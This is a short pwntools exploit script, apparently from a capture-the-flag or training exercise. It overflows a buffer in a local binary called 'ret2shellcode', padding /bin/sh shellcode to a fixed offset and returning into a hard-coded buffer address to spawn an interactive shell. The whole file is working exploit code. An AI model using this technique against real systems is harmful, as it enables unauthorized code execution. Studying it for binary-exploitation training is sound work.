from pwn import *
sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x0804a080
#print('shellcode length :{}'.format(len(shellcode)))
offset = 0x6c + 4
shellcode_pad = shellcode + ((offset-len(shellcode))*b'l')
sh.recvline()
sh.sendline(shellcode_pad +p32(buf2_addr))
#sh.sendline(shellcode.ljust(offset, b'Z') + p32(buf2_addr))
sh.interactive()
